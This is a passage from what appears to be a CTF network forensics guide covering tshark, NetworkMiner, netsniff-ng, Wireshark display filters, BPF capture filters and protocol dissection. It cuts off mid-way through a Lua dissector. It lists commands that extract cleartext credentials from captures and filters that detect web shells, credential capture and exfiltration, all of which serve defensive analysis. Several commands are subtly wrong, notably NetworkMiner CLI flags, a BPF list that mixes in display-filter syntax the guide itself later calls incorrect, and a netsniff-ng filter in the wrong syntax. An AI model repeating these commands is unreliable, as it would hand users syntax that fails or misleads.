tshark -r capture.pcap -Y http.request -T fields -e http.user_agent | sort -u

# Timeline of connections
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport

# Extract credentials from clear-text protocols
tshark -r capture.pcap -Y 'ftp or telnet or http.authbasic' -V | grep -i "password\|user"
```

**Performance Tips**

```bash
# Disable name resolution for speed
tshark -n -r capture.pcap

# Process only first N packets
tshark -r capture.pcap -c 1000

# Use read filter instead of display filter when possible
tshark -r capture.pcap -R 'http' -w filtered.pcap  # Deprecated
tshark -r capture.pcap -Y 'http' -w filtered.pcap  # Current syntax
```

**Combining with Other Tools**

```bash
# Pipe to grep
tshark -r capture.pcap -Y http -T fields -e http.request.uri | grep admin

# Pipe to awk for statistics
tshark -r capture.pcap -T fields -e ip.src | awk '{count[$1]++} END {for(ip in count) print count[ip], ip}' | sort -rn

# Pipe to jq (with JSON output)
tshark -r capture.pcap -T json | jq '.[] | select(._source.layers.http.http_request_uri | contains("admin"))'

# Convert to CSV and process
tshark -r capture.pcap -T fields -E separator=, -e ip.src -e ip.dst > traffic.csv
```

---

**Key Differences Summary**

| Feature             | Wireshark       | tcpdump   | tshark           |
| ------------------- | --------------- | --------- | ---------------- |
| Interface           | GUI             | CLI       | CLI              |
| Protocol dissection | Deep            | Basic     | Deep             |
| Filter syntax       | Display/Capture | BPF only  | Display/Capture  |
| File export         | Native          | Raw only  | Multiple formats |
| Scripting           | Limited         | Excellent | Excellent        |
| Resource usage      | High            | Low       | Medium           |
| Real-time analysis  | Visual          | Text      | Text             |

## NetworkMiner

NetworkMiner is a passive network sniffer and packet analyzer designed for forensic analysis and incident response. Unlike active tools, it performs passive reconstruction of network artifacts without generating traffic.

**Core Functionality**

NetworkMiner automatically extracts and displays network conversations, artifacts, and metadata without requiring manual packet inspection. It reconstructs files, emails, and credentials from captured traffic, making it valuable for CTF scenarios involving traffic analysis and evidence recovery.

**Installation and Basic Usage**

```
sudo apt install networkminer
sudo networkminer
```

The GUI opens with a file browser. Load PCAP files via File → Open or drag files directly into the interface.

**Command-Line Operations**

```
networkminer -r capture.pcap -o output_directory
networkminer -r capture.pcap -a 192.168.1.100
```

The `-r` flag specifies the input PCAP file. The `-o` flag defines the output directory for extracted artifacts. The `-a` flag filters analysis to a specific IP address.

**CTF-Relevant Features**

Hosts tab displays all detected IP addresses, MAC addresses, and associated metadata. The Credentials tab automatically extracts usernames and passwords from plaintext protocols (FTP, Telnet, HTTP Basic Auth). Files tab shows reconstructed files from network transfers. DNS tab reveals DNS queries and responses, useful for identifying command-and-control communications or data exfiltration domains. The Messages tab extracts email, chat, and other text-based communications.

**Advanced Artifact Extraction**

NetworkMiner recovers images, documents, and executables transmitted over unencrypted connections. In CTF scenarios, this often yields flags embedded in transmitted files or credentials visible in protocol exchanges. The tool reconstructs TCP/UDP streams by application layer, making fragmented data recovery straightforward.

**Parameter Combinations for CTF Analysis**

```
networkminer -r traffic.pcap -a 10.0.0.5 -o ./analysis
networkminer -r traffic.pcap -p ftp,telnet,http
```

Filter by protocol family using the `-p` flag. Multiple protocols use comma-separated values. This narrows analysis to relevant traffic types in large captures.

---

## netsniff-ng

netsniff-ng is a high-performance packet sniffer, pcap-to-pcap converter, and network analyzer optimized for bulk traffic processing and forensic capture. It operates at kernel level for minimal packet loss during high-volume captures.

**Installation**

```
sudo apt install netsniff-ng
```

Verify installation:

```
netsniff-ng --version
```

**Live Packet Capture**

```
sudo netsniff-ng -i eth0 -o capture.pcap
sudo netsniff-ng -i any -o traffic.pcap -c 10000
```

The `-i` flag specifies interface (or `any` for all interfaces). The `-o` flag writes to PCAP output file. The `-c` flag limits packet count. Omit `-c` to capture indefinitely (stop with Ctrl+C).

**Filtering During Capture**

```
sudo netsniff-ng -i eth0 -o suspect.pcap -f "tcp port 80"
sudo netsniff-ng -i eth0 -o data.pcap -f "host 192.168.1.50"
```

The `-f` flag applies Berkeley Packet Filter (BPF) syntax during capture. Filtering at kernel level reduces disk I/O and improves capture reliability on bandwidth-constrained systems.

**PCAP Conversion and Manipulation**

```
netsniff-ng -i capture.pcap -o converted.pcap --verbose
netsniff-ng -i input.pcap -o output.pcap -V
```

Read PCAP with `-i` and write with `-o`. The `-V` flag enables verbose mode, displaying packet statistics and potential anomalies. This converts incompatible PCAP formats between tools.

**Real-Time Packet Analysis**

```
sudo netsniff-ng -i eth0 --dissect
sudo netsniff-ng -i eth0 --dissect -f "tcp.port == 3306"
```

The `--dissect` flag enables live dissection and display of protocol headers without saving to disk. Filter specific traffic for focused real-time analysis.

**Performance Optimization for High-Volume Captures**

```
sudo netsniff-ng -i eth0 -o /dev/shm/capture.pcap -J -c 1000000
```

Writing to `/dev/shm` (RAM disk) accelerates I/O on systems with sufficient memory. The `-J` flag enables jumbo frame support. Large `-c` values accommodate extended capture sessions.

**DNS Resolution and Metadata**

```
sudo netsniff-ng -i eth0 --dissect -S
```

The `-S` flag enables name resolution during packet display, converting IP addresses to hostnames where possible.

---

## Capture Filters vs Display Filters

These represent distinct filtering mechanisms applied at different stages of packet analysis. Understanding the distinction prevents inefficient workflows and missed data.

**Capture Filters (Kernel Level)**

Capture filters operate at the packet capture stage, before packets enter user-space applications. They use Berkeley Packet Filter (BPF) syntax and reduce disk I/O by discarding unwanted packets at kernel level.

Syntax characteristics:

- Protocol: `tcp`, `udp`, `icmp`, `arp`, `ip`, `ipv6`
- Port operators: `port 80`, `portrange 1024-65535`, `tcp.port == 443`
- Direction: `src` (source), `dst` (destination), `src or dst`
- Logical operators: `and`, `or`, `not`
- Parentheses for grouping: `(tcp and port 80) or (udp and port 53)`

**Capture Filter Examples in netsniff-ng**

```
sudo netsniff-ng -i eth0 -o web.pcap -f "tcp port 80 or tcp port 443"
sudo netsniff-ng -i eth0 -o dns.pcap -f "udp port 53"
sudo netsniff-ng -i eth0 -o filtered.pcap -f "src 192.168.1.0/24 and tcp"
sudo netsniff-ng -i eth0 -o not_local.pcap -f "not 192.168.1.1"
```

The first command captures only HTTP and HTTPS traffic. The second isolates DNS queries. The third captures TCP traffic originating from the local subnet. The fourth excludes the gateway device from capture.

**Capture Filters with tcpdump**

```
sudo tcpdump -i eth0 -w capture.pcap "tcp port 22"
sudo tcpdump -i eth0 -w capture.pcap "icmp or arp"
sudo tcpdump -i eth0 -w capture.pcap "src net 10.0.0.0/8 and dst port 443"
```

**Display Filters (User-Space)**

Display filters operate post-capture, within analysis applications like Wireshark. They do not reduce disk I/O or kernel processing—all packets are captured. Display filters use Wireshark Display Filter syntax, which is more granular than BPF but computationally applied only during analysis.

Syntax characteristics:

- Protocol fields: `ip.src`, `tcp.dstport`, `http.request.method`, `dns.qry.name`
- Comparison operators: `==`, `!=`, `>`, `<`, `>=`, `<=`, `contains`, `matches`
- Logical operators: `and`, `or`, `not`, `xor`
- Functions: `len()`, `string.upper()`, `ipv4.src` range operations

**Display Filter Examples in Wireshark**

```
ip.src == 192.168.1.50
tcp.flags.syn == 1 and tcp.flags.ack == 0
http.request.method == "POST"
dns.qry.name contains "malware.com"
frame.len > 1500
ip.proto == 6
tcp.stream eq 5
```

The first filter displays packets from a specific source IP. The second isolates SYN packets (connection initiators) by checking TCP flag bits. The third shows POST requests. The fourth identifies DNS queries for a suspicious domain. The fifth displays packets exceeding MTU size (potential fragmentation issues). The sixth shows TCP traffic only. The seventh displays a specific TCP stream for sequential analysis.

**Comparison: When to Use Each**

Use capture filters when disk space, bandwidth, or processing power is constrained. They discard unwanted data at the kernel, reducing I/O load. In CTF scenarios with large network segments or long capture durations, capture filtering prevents disk exhaustion.

Use display filters for detailed post-capture analysis. They allow hypothesis testing without re-running captures. When analyzing forensic PCAPs after collection, display filters provide granular control for investigating specific anomalies or protocol exchanges.

**Combined Workflow for CTF Analysis**

Capture broadly with minimal filtering:

```
sudo netsniff-ng -i eth0 -o large_capture.pcap
```

Then apply display filters in Wireshark or with command-line tools:

```
tcpdump -r large_capture.pcap "tcp port 3306" -w mysql_traffic.pcap
```

This approach balances capture completeness with focused analysis.

**Protocol-Specific Considerations**

For TLS/SSL traffic: capture filters cannot decrypt data, but display filters can identify handshake patterns. Capture symmetric encryption traffic broadly; analyze certificate exchanges and cipher suites with display filters.

For DNS tunneling detection: capture all DNS traffic initially (`udp port 53`), then use display filters to identify anomalously large DNS responses or query patterns indicative of data exfiltration.

For reconnaissance traffic: capture ICMP and ARP broadly, then display filter for specific ping patterns or ARP spoofing indicators.

---

**Related Topics for Progression**

Protocol dissection and header analysis form the foundation for advanced traffic reconstruction. Stream reassembly and payload extraction techniques build upon filter proficiency. Anomaly detection methodologies leverage filtering for identifying intrusion indicators and attack signatures.

---

# Wireshark Deep Dive

## Interface Navigation

Wireshark's interface consists of several key components that facilitate packet capture and analysis:

**Main Window Components:**

- **Menu Bar**: Contains File, Edit, View, Go, Capture, Analyze, Statistics, Telephony, Wireless, Tools, and Help menus
- **Main Toolbar**: Quick access to frequently used functions (Start/Stop capture, Open/Save, Find packet)
- **Filter Toolbar**: Located directly below main toolbar, contains display filter input field with Apply/Clear buttons
- **Packet List Pane**: Top section showing captured packets in columnar format (No., Time, Source, Destination, Protocol, Length, Info)
- **Packet Details Pane**: Middle section displaying protocol layer breakdown in expandable tree format
- **Packet Bytes Pane**: Bottom section showing raw hexadecimal and ASCII representation of selected packet

**Navigation Commands:**

```bash
# Launch Wireshark
wireshark

# Launch with specific interface
wireshark -i eth0

# Launch with capture file
wireshark -r capture.pcap

# Launch in background
wireshark &
```

**Keyboard Navigation Shortcuts:**

- `Ctrl + E`: Start/Stop capture
- `Ctrl + K`: Capture options
- `Ctrl + W`: Close current capture file
- `Ctrl + F`: Find packet
- `Ctrl + N`: Find next matching packet
- `Ctrl + G`: Go to specific packet number
- `Ctrl + Left/Right Arrow`: Jump to previous/next packet in conversation
- `Ctrl + Up/Down Arrow`: Navigate to previous/next marked packet
- `Ctrl + M`: Mark/unmark packet
- `Ctrl + Shift + M`: Mark all displayed packets
- `Alt + Up/Down Arrow`: Move to previous/next packet in packet list
- `Space`: Expand/collapse selected protocol layer
- `Left/Right Arrow`: Collapse/expand all protocol layers
- `Tab`: Switch between packet list, details, and bytes panes

**Column Customization:**

Right-click column headers to:

- Add/remove columns
- Align column content
- Resize columns
- Edit column preferences

**Common Custom Columns to Add:**

```
Column Type: Custom
Field Name: tcp.stream (TCP Stream Index)
Field Name: http.request.uri (HTTP URI)
Field Name: dns.qry.name (DNS Query Name)
Field Name: ip.ttl (IP TTL)
Field Name: tcp.flags (TCP Flags)
```

**Packet List Color Rules:**

Navigate to View → Coloring Rules to access or modify packet colorization:

- Bad TCP packets (black/red)
- HTTP requests (light green)
- HTTP responses (light yellow)
- DNS (light blue)
- TCP SYN/FIN (grey)

**Profile Management:**

Wireshark supports multiple configuration profiles:

```
Edit → Configuration Profiles
```

Create specialized profiles for different CTF scenarios (web exploitation, network forensics, malware analysis).

**Stream Following:**

Right-click packet → Follow → [Protocol] Stream:

- TCP Stream (shows bidirectional conversation)
- UDP Stream
- TLS Stream
- HTTP Stream

Keyboard: `Ctrl + Alt + Shift + T` (TCP Stream)

**Expert Information:**

Analyze → Expert Information (or bottom-left indicator icon)

Shows categorized packet anomalies:

- Errors (red)
- Warnings (yellow)
- Notes (cyan)
- Chats (blue)

## Display Filters Syntax

Display filters are applied after packet capture to selectively show packets of interest. They do not affect capture performance.

**Basic Syntax Structure:**

```
[protocol].[field] [comparison operator] [value]
```

**Comparison Operators:**

- `==` or `eq`: Equal
- `!=` or `ne`: Not equal
- `>` or `gt`: Greater than
- `<` or `lt`: Less than
- `>=` or `ge`: Greater than or equal
- `<=` or `le`: Less than or equal
- `contains`: Contains substring
- `matches` or `~`: Regex match
- `&`: Bitwise AND
- `in`: Set membership

**Logical Operators:**

- `and` or `&&`: Logical AND
- `or` or `||`: Logical OR
- `not` or `!`: Logical NOT
- `xor` or `^^`: Logical XOR

**Protocol-Based Filters:**

```bash
# Show only HTTP traffic
http

# Show only DNS traffic
dns

# Show only TCP traffic
tcp

# Show only ICMP traffic
icmp

# Show TLS/SSL traffic
tls

# Show SMB traffic
smb || smb2

# Show FTP traffic
ftp || ftp-data
```

**IP-Based Filters:**

```bash
# Source IP
ip.src == 192.168.1.100

# Destination IP
ip.dst == 10.0.0.1

# Either source or destination
ip.addr == 192.168.1.50

# IP subnet
ip.addr == 192.168.1.0/24

# Multiple IPs
ip.addr == 192.168.1.10 || ip.addr == 192.168.1.20

# Exclude IP
!(ip.addr == 192.168.1.1)

# Private IP ranges
ip.src == 10.0.0.0/8 || ip.src == 172.16.0.0/12 || ip.src == 192.168.0.0/16
```

**TCP-Based Filters:**

```bash
# TCP port (source or destination)
tcp.port == 80

# Source port
tcp.srcport == 443

# Destination port
tcp.dstport == 22

# Port range
tcp.port >= 1024 && tcp.port <= 49151

# TCP flags
tcp.flags.syn == 1
tcp.flags.ack == 1
tcp.flags.reset == 1
tcp.flags.fin == 1
tcp.flags.push == 1

# SYN packet without ACK (connection initiation)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# SYN-ACK packet
tcp.flags.syn == 1 && tcp.flags.ack == 1

# TCP stream index
tcp.stream == 5

# TCP retransmissions
tcp.analysis.retransmission

# TCP out-of-order
tcp.analysis.out_of_order

# TCP window size
tcp.window_size_value < 1024
```

**UDP-Based Filters:**

```bash
# UDP port
udp.port == 53

# Source port
udp.srcport == 5353

# Destination port
udp.dstport == 123

# UDP length
udp.length > 1000
```

**HTTP-Based Filters:**

```bash
# HTTP requests only
http.request

# HTTP responses only
http.response

# Specific HTTP method
http.request.method == "GET"
http.request.method == "POST"
http.request.method == "PUT"

# HTTP status codes
http.response.code == 200
http.response.code == 404
http.response.code >= 400

# HTTP host header
http.host == "example.com"
http.host contains "target"

# HTTP URI
http.request.uri contains "admin"
http.request.uri contains ".php"

# HTTP user agent
http.user_agent contains "curl"
http.user_agent contains "python"

# HTTP cookies
http.cookie contains "sessionid"

# HTTP content type
http.content_type contains "application/json"

# HTTP with specific headers
http.request.line contains "X-Forwarded-For"
```

**DNS-Based Filters:**

```bash
# DNS queries
dns.flags.response == 0

# DNS responses
dns.flags.response == 1

# DNS query name
dns.qry.name == "example.com"
dns.qry.name contains "target"

# DNS query type
dns.qry.type == 1  # A record
dns.qry.type == 28 # AAAA record
dns.qry.type == 15 # MX record
dns.qry.type == 16 # TXT record

# DNS response codes
dns.flags.rcode == 0  # No error
dns.flags.rcode == 3  # NXDOMAIN (non-existent domain)
```

**TLS/SSL Filters:**

```bash
# TLS handshake
tls.handshake

# Client Hello
tls.handshake.type == 1

# Server Hello
tls.handshake.type == 2

# Certificate
tls.handshake.type == 11

# TLS version
tls.record.version == 0x0303  # TLS 1.2
tls.record.version == 0x0304  # TLS 1.3

# Server Name Indication (SNI)
tls.handshake.extensions_server_name contains "example"
```

**FTP Filters:**

```bash
# FTP commands
ftp.request.command

# FTP login
ftp.request.command == "USER"
ftp.request.command == "PASS"

# FTP file operations
ftp.request.command == "RETR"
ftp.request.command == "STOR"

# FTP responses
ftp.response.code
```

**Advanced Filter Techniques:**

```bash
# Packet length
frame.len > 1000
frame.len < 100

# Time-based filtering (seconds since first packet)
frame.time_relative > 10 && frame.time_relative < 20

# Packets containing specific hex pattern
frame contains 89:50:4e:47  # PNG file signature

# Packets containing ASCII string
frame contains "password"
frame contains "flag{"

# Regex matching
http.host matches ".*\\.target\\.com$"
dns.qry.name matches "^[a-f0-9]{32}\\..*"

# Multiple protocols in conversation
(tcp.port == 80 || tcp.port == 443) && ip.addr == 192.168.1.100

# Exclude specific traffic
!(arp || icmpv6 || stp)

# Broadcast/multicast
eth.dst == ff:ff:ff:ff:ff:ff  # Broadcast
eth.dst[0] & 1  # Multicast

# Fragmented IP packets
ip.flags.mf == 1 || ip.frag_offset > 0

# ICMP types
icmp.type == 8  # Echo request (ping)
icmp.type == 0  # Echo reply

# ARP operations
arp.opcode == 1  # ARP request
arp.opcode == 2  # ARP reply

# Data exfiltration patterns
(http.request.method == "POST" && frame.len > 5000) || (dns.qry.name && frame.len > 512)
```

**Filter Macros:**

Create reusable filter macros in `Edit → Preferences → Filter Expressions`.

**Common CTF Display Filter Combinations:**

```bash
# Web shell detection
http.request.uri contains "cmd" || http.request.uri contains "exec"

# Credential capture
(http.request.method == "POST" && (http contains "password" || http contains "username")) || ftp.request.command == "PASS"

# Suspicious DNS
dns.qry.name matches "^[a-f0-9]{20,}" || (dns && frame.len > 512)

# Port scanning detection
(tcp.flags.syn == 1 && tcp.flags.ack == 0) && tcp.window_size_value == 1024

# Data transfer
(http.content_length > 100000) || (ftp.request.command == "RETR" || ftp.request.command == "STOR")
```

## Capture Filters (BPF)

Capture filters use Berkeley Packet Filter (BPF) syntax and are applied during packet capture. They reduce capture file size by excluding unwanted traffic at capture time. [Unverified: specific performance impacts vary by system configuration].

**Critical Difference:**

- **Capture filters**: Applied during capture, use BPF syntax, improve performance, packets are discarded
- **Display filters**: Applied after capture, use Wireshark syntax, no performance impact on capture, packets are retained

**BPF Syntax Structure:**

```
[protocol] [direction] [type] [value]
```

**Basic BPF Primitives:**

```bash
# Host filtering
host 192.168.1.100

# Source host
src host 10.0.0.5

# Destination host
dst host 192.168.1.1

# Network (CIDR)
net 192.168.0.0/24
net 10.0.0.0/8

# Port filtering
port 80
port 443

# Source port
src port 12345

# Destination port
dst port 22

# Port range
portrange 1-1024
```

**Protocol Filters:**

```bash
# TCP traffic
tcp

# UDP traffic
udp

# ICMP traffic
icmp

# ARP traffic
arp

# IP traffic
ip
ip6  # IPv6

# Ether protocol
ether proto 0x0800  # IPv4
ether proto 0x0806  # ARP
ether proto 0x86dd  # IPv6
```

**Logical Operators:**

```bash
# AND
&&
and

# OR
||
or

# NOT
!
not
```

**Direction Qualifiers:**

```bash
src     # Source
dst     # Destination
src or dst  # Either (default)
src and dst # Both (rarely used)
```

**Combined BPF Filters:**

```bash
# HTTP traffic
tcp port 80 or tcp port 443

# Specific host and port
host 192.168.1.50 and port 22

# Exclude specific host
not host 192.168.1.1

# Multiple ports
tcp port 80 or tcp port 8080 or tcp port 8443

# Subnet and protocol
net 10.0.0.0/8 and tcp

# Source IP and destination port
src host 192.168.1.100 and dst port 443

# Capture all traffic except SSH
not port 22

# Multiple exclusions
not (port 22 or port 53)
```

**Advanced BPF Expressions:**

```bash
# TCP SYN packets
tcp[tcpflags] & tcp-syn != 0

# TCP SYN packets without ACK (connection attempts)
tcp[tcpflags] == tcp-syn

# TCP flags (SYN, ACK, FIN, RST, PSH, URG)
tcp[13] & 2 != 0  # SYN
tcp[13] & 16 != 0 # ACK
tcp[13] & 1 != 0  # FIN
tcp[13] & 4 != 0  # RST

# TCP SYN-ACK
tcp[13] == 18

# UDP packets larger than 1000 bytes
udp and greater 1000

# IP packets with specific TTL
ip[8] == 64

# IP packets with DF flag set
ip[6] & 0x40 != 0

# ICMP echo requests
icmp[icmptype] == icmp-echo

# ICMP echo replies
icmp[icmptype] == icmp-echoreply

# Broadcast packets
ether dst ff:ff:ff:ff:ff:ff

# Multicast packets
ether multicast
```

**Byte Offset Filtering:**

BPF allows direct byte offset access within protocol headers.

**Syntax:**

```
protocol[offset:length]
protocol[offset]
```

**Examples:**

```bash
# Check byte at offset 0 in TCP header (source port high byte)
tcp[0:2] == 80

# Check specific byte value
ip[9] == 6  # Protocol field == TCP

# HTTP GET requests (checking payload)
tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420  # "GET "

# HTTP POST requests
tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354  # "POST"

# DNS queries (UDP port 53 with QR bit = 0)
udp port 53 and udp[10] & 0x80 = 0
```

**Ethernet-Level Filters:**

```bash
# MAC address
ether host 00:11:22:33:44:55

# Source MAC
ether src 00:11:22:33:44:55

# Destination MAC
ether dst 00:11:22:33:44:55

# Broadcast
ether broadcast

# Multicast
ether multicast

# VLAN tagged packets
vlan

# Specific VLAN ID
vlan 100
```

**CTF-Specific Capture Filters:**

```bash
# Capture only HTTP and DNS
tcp port 80 or tcp port 443 or udp port 53

# Capture specific target communication
host 10.10.10.50 and (tcp or udp)

# Capture everything except noise
not (arp or icmp6 or port 22)

# Capture potential data exfiltration
tcp portrange 1024-65535 and greater 1000

# Capture from specific interface
-i eth0 'tcp port 80'

# Capture with snaplen (limit bytes per packet)
-s 96 'tcp port 80'  # Capture only headers

# Capture limited packet count
-c 1000 'tcp'
```

**Command-Line Capture with tcpdump:**

```bash
# Basic capture to file
tcpdump -i eth0 -w capture.pcap

# Capture with filter
tcpdump -i eth0 'tcp port 80' -w http_traffic.pcap

# Capture without DNS resolution (faster)
tcpdump -n -i eth0 -w capture.pcap

# Capture with timestamp and verbose
tcpdump -tttt -v -i eth0 'host 192.168.1.100'

# Capture specific protocol with limited snaplen
tcpdump -i eth0 -s 96 'tcp port 80' -w headers_only.pcap

# Capture and display immediately
tcpdump -i eth0 'tcp port 443' -X  # Show hex and ASCII

# Capture with packet count limit
tcpdump -i eth0 -c 500 'udp port 53' -w dns.pcap

# Capture all interfaces
tcpdump -i any -w all_interfaces.pcap
```

**Wireshark Command-Line Capture:**

```bash
# Capture using tshark (Wireshark CLI)
tshark -i eth0 -w capture.pcap

# Capture with BPF filter
tshark -i eth0 -f 'tcp port 80' -w http.pcap

# Capture with packet count limit
tshark -i eth0 -c 1000 -w limited.pcap

# Capture with ring buffer (multiple files)
tshark -i eth0 -b filesize:100000 -b files:5 -w capture.pcap

# Capture and display specific fields
tshark -i eth0 -f 'tcp port 80' -T fields -e ip.src -e ip.dst -e tcp.port
```

**Performance Optimization:**

```bash
# Increase buffer size (reduce packet drops)
tcpdump -B 4096 -i eth0 -w capture.pcap

# Use snaplen to capture only headers
tcpdump -s 128 -i eth0 -w headers.pcap

# Disable DNS resolution
tcpdump -n -i eth0 -w capture.pcap

# Capture to faster storage
tcpdump -i eth0 -w /dev/shm/capture.pcap
```

**Common BPF Mistakes:**

```bash
# INCORRECT: Mixing display filter syntax
host 192.168.1.1 && tcp.port == 80  # Wrong

# CORRECT: Use BPF syntax only
host 192.168.1.1 and tcp port 80  # Correct

# INCORRECT: Using contains
tcp contains "GET"  # Not valid in BPF

# CORRECT: Use byte offset
tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420

# INCORRECT: Using protocol.field notation
ip.src == 192.168.1.1  # Display filter syntax

# CORRECT: Use BPF primitive
src host 192.168.1.1
```

**Important Considerations:**

- Capture filters cannot be changed during active capture
- Invalid capture filter syntax prevents capture from starting
- Overly restrictive filters may miss important traffic in CTF scenarios
- [Inference: Based on typical CTF patterns] When uncertain about required traffic, use permissive capture filters and apply display filters during analysis

---

## Protocol Dissection

### Understanding Wireshark's Dissection Architecture

Wireshark uses a hierarchical dissection system where each protocol layer is decoded sequentially. The dissection engine matches packet data against protocol dissectors based on port numbers, payload patterns, and heuristic analysis.

**Dissection Layers:**

```
Frame → Ethernet → IP → TCP/UDP → Application Protocol
```

### Accessing Protocol Dissectors

```bash
# List all available dissectors (CLI)
tshark -G protocols

# List specific protocol fields
tshark -G fields | grep "http"
tshark -G fields | grep "dns"
tshark -G fields | grep "tcp"

# Show dissector tables (port mappings)
tshark -G decodes

# Count available dissectors
tshark -G protocols | wc -l
```

### Protocol Hierarchy Analysis

**GUI Method:**

1. Open pcap file in Wireshark
2. Navigate to: **Statistics → Protocol Hierarchy**
3. View breakdown showing:
    - Percentage of packets per protocol
    - Bytes transmitted per protocol
    - Packet count per protocol

**CLI Method:**

```bash
# Generate protocol hierarchy statistics
tshark -r capture.pcap -qz io,phs

# Example output interpretation:
# Shows nested protocol structure with packet/byte counts
tshark -r capture.pcap -qz io,phs > protocol_hierarchy.txt
```

### Frame-Level Dissection

```bash
# Display frame-level details
tshark -r capture.pcap -V -c 1

# Extract specific frame fields
tshark -r capture.pcap -T fields -e frame.number -e frame.time -e frame.len

# Frame timing analysis
tshark -r capture.pcap -T fields -e frame.time_delta -e frame.time_delta_displayed

# Frame interface information
tshark -r capture.pcap -T fields -e frame.interface_id -e frame.interface_name
```

### Ethernet Layer Dissection

```bash
# MAC address analysis
tshark -r capture.pcap -T fields -e eth.src -e eth.dst

# Identify Ethernet frame types
tshark -r capture.pcap -T fields -e eth.type

# VLAN tag extraction
tshark -r capture.pcap -T fields -e vlan.id -e vlan.priority

# Filter by MAC address
tshark -r capture.pcap -Y "eth.addr == 00:11:22:33:44:55"
```

### IP Layer Dissection

```bash
# Extract IP addresses and protocols
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e ip.proto

# TTL analysis (useful for OS fingerprinting)
tshark -r capture.pcap -T fields -e ip.ttl -e ip.src

# IP fragmentation detection
tshark -r capture.pcap -Y "ip.flags.mf == 1 || ip.frag_offset > 0"

# Extract IP options (rare but important for security analysis)
tshark -r capture.pcap -T fields -e ip.opt.type

# IP header length anomalies
tshark -r capture.pcap -Y "ip.hdr_len > 20"
```

### TCP Dissection

**TCP Flags Analysis:**

```bash
# Extract TCP flags
tshark -r capture.pcap -T fields -e tcp.flags -e tcp.flags.str

# Find SYN packets (connection attempts)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0"

# Find SYN-ACK packets
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 1"

# Find RST packets (connection resets)
tshark -r capture.pcap -Y "tcp.flags.reset == 1"

# Find FIN packets (graceful close)
tshark -r capture.pcap -Y "tcp.flags.fin == 1"

# Find PSH-ACK packets (data transmission)
tshark -r capture.pcap -Y "tcp.flags.push == 1 && tcp.flags.ack == 1"
```

**TCP Sequence Analysis:**

```bash
# Extract sequence and acknowledgment numbers
tshark -r capture.pcap -T fields -e tcp.seq -e tcp.ack -e tcp.len

# Detect retransmissions
tshark -r capture.pcap -Y "tcp.analysis.retransmission"

# Find duplicate ACKs
tshark -r capture.pcap -Y "tcp.analysis.duplicate_ack"

# Detect out-of-order segments
tshark -r capture.pcap -Y "tcp.analysis.out_of_order"

# Window size analysis (performance issues)
tshark -r capture.pcap -T fields -e tcp.window_size -e tcp.window_size_scalefactor
```

**TCP Options Extraction:**

```bash
# Maximum Segment Size (MSS)
tshark -r capture.pcap -T fields -e tcp.options.mss_val

# Window scaling factor
tshark -r capture.pcap -T fields -e tcp.options.wscale_val

# SACK (Selective Acknowledgment)
tshark -r capture.pcap -Y "tcp.options.sack"

# Timestamp options (RTT calculation)
tshark -r capture.pcap -T fields -e tcp.options.timestamp.tsval -e tcp.options.timestamp.tsecr
```

### UDP Dissection

```bash
# Basic UDP field extraction
tshark -r capture.pcap -Y "udp" -T fields -e udp.srcport -e udp.dstport -e udp.length

# UDP checksum verification
tshark -r capture.pcap -Y "udp.checksum.status == 2"  # Bad checksum

# UDP port analysis
tshark -r capture.pcap -Y "udp" -T fields -e udp.port | sort | uniq -c | sort -rn
```

### DNS Dissection

```bash
# DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# DNS responses
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.qry.name -e dns.a

# DNS transaction ID correlation
tshark -r capture.pcap -T fields -e dns.id -e dns.qry.name -e dns.flags.response

# DNS query types
tshark -r capture.pcap -T fields -e dns.qry.type -e dns.qry.name

# DNS response codes
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.flags.rcode

# Find DNS tunneling indicators
tshark -r capture.pcap -Y "dns && frame.len > 512"  # Unusually large DNS packets
tshark -r capture.pcap -Y "dns.qry.type == 16"  # TXT records often used for tunneling
```

### HTTP Dissection

```bash
# HTTP request methods
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.method -e http.request.uri

# HTTP response codes
tshark -r capture.pcap -Y "http.response" -T fields -e http.response.code -e http.response.phrase

# User-Agent extraction
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent

# HTTP headers
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri -e http.cookie

# Extract HTTP file transfers
tshark -r capture.pcap -Y "http.content_type" -T fields -e http.content_type -e http.content_length

# HTTP authentication credentials (Base64 encoded)
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization
```

### HTTPS/TLS Dissection

```bash
# TLS handshake packets
tshark -r capture.pcap -Y "tls.handshake"

# Client Hello analysis
tshark -r capture.pcap -Y "tls.handshake.type == 1" -T fields -e tls.handshake.ciphersuite

# Server Hello
tshark -r capture.pcap -Y "tls.handshake.type == 2" -T fields -e tls.handshake.ciphersuite

# Extract Server Name Indication (SNI)
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name

# Certificate analysis
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e x509sat.uTF8String

# TLS version detection
tshark -r capture.pcap -Y "tls" -T fields -e tls.record.version

# Identify weak ciphers
tshark -r capture.pcap -Y "tls.handshake.ciphersuite == 0x0005"  # RC4 example
```

**TLS Decryption with Pre-Master Secret:**

In Wireshark GUI:

1. **Edit → Preferences → Protocols → TLS**
2. Set **(Pre)-Master-Secret log filename** to path of SSL keylog file
3. Reload capture

Generate SSL keylog file:

```bash
# Set environment variable before running browser/application
export SSLKEYLOGFILE=/tmp/sslkey.log
firefox  # Or any application
```

### Custom Protocol Dissection

**Using Lua Dissectors:**

```lua
-- Save as custom_protocol.lua in Wireshark plugins directory
-- ~/.local/lib/wireshark/plugins/ or /usr/lib/x86_64-linux-gnu/wireshark/plugins/

local custom_proto = Proto("custom", "Custom CTF Protocol")

local f_magic = ProtoField.uint16("custom.magic", "Magic Value", base.HEX)
local f_command = ProtoField.uint8("custom.command", "Command")
local f_data = ProtoField.string("custom.data", "Data")

custom_proto.fields = {f_magic, f_command, f_data}

